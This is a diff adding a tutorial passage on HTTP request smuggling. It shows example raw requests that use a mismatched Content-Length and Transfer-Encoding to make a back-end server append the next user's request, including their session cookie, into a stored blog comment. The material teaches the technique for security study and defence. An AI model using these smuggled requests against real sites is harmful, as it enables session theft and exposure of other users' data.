@@ -1,0 +1,46 @@
+Capturing other users' requests
+If the application contains any kind of functionality that allows you to store and later retrieve textual data, you can potentially use this to capture the contents of other users' requests. These may include session tokens or other sensitive data submitted by the user. Suitable functions to use as the vehicle for this attack would be comments, emails, profile descriptions, screen names, and so on.
+
+To perform the attack, you need to smuggle a request that submits data to the storage function, with the parameter containing the data to store positioned last in the request. For example, suppose an application uses the following request to submit a blog post comment, which will be stored and displayed on the blog:
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 154
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&comment=My+comment&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net
+Now consider what would happen if you smuggle an equivalent request with an overly long Content-Length header and the comment parameter positioned at the end of the request as follows:
+
+GET / HTTP/1.1
+Host: vulnerable-website.com
+Transfer-Encoding: chunked
+Content-Length: 330
+
+0
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=
+The Content-Length header of the smuggled request indicates that the body will be 400 bytes long, but we've only sent 144 bytes. In this case, the back-end server will wait for the remaining 256 bytes before issuing the response, or else issue a timeout if this doesn't arrive quick enough. As a result, when another request is sent to the back-end server down the same connection, the first 256 bytes are effectively appended to the smuggled request as follows:
+
+POST /post/comment HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=BOe1lFDosZ9lk7NLUpWcG8mjiwbeNZAO
+
+csrf=SmsWiwIJ07Wg5oqX87FfUVkMThn9VzO0&postId=2&name=Carlos+Montoya&email=carlos%40normal-user.net&website=https%3A%2F%2Fnormal-user.net&comment=GET / HTTP/1.1
+Host: vulnerable-website.com
+Cookie: session=jJNLJs2RKpbg9EQ7iWrcfzwaTvMw81Rj
+... 
+As the start of the victim's request is contained in the comment parameter, this will be posted as a comment on the blog, enabling you to read it simply by visiting the relevant post.
+
+To capture more of the victim's request, you just need to increase the value of the smuggled request's Content-Length header accordingly, but note that this will involve a certain amount of trial and error. If you encounter a timeout, this probably means that the Content-Length you've specified is higher than the actual length of the victim's request. In this case, simply reduce the value until the attack works again.
+
+Note
+One limitation with this technique is that it will generally only capture data up until the parameter delimiter that is applicable for the smuggled request. For URL-encoded form submissions, this will be the & character, meaning that the content that is stored from the victim user's request will end at the first &, which might even appear in the query string
